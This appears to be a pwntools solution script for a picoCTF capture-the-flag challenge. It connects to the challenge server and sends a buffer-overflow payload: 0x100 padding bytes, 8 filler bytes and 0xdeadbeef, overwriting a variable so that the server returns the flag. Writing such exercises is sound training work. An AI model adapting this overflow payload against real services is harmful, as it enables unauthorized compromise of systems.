#!/usr/bin/env python3

from pwn import *

#exe = ELF("./chall_patched")
#context.binary = exe

def main():
    #p = process('./chall_patched')
    p = remote('mars.picoctf.net', 31890)
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
    #gdb.attach(p)
    #sleep(5)

    overflow = b'A' * 0x100
    fill = b'A' * 8
    code_var_overflow = p64(0xdeadbeef)

    payload = b''.join([
        overflow,
        fill,
        code_var_overflow
    ])

    p.sendlineafter(b'What do you see?', payload)
    flag = p.recvline_contains(b'picoCTF')
    log.info("Flag={}".format(flag))

    p.interactive()


if __name__ == "__main__":
    main()
